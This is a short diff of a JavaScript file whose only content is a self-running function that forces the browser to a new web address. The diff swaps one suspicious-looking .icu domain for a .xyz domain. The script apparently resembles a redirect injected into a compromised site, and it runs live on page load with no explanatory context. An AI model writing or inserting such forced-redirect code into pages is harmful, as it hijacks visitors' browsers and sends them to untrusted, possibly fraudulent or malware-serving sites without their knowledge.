@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://letsvp-lesw.icu/';
+    window['location'] = 'https://teasmles.xyz';
 })();
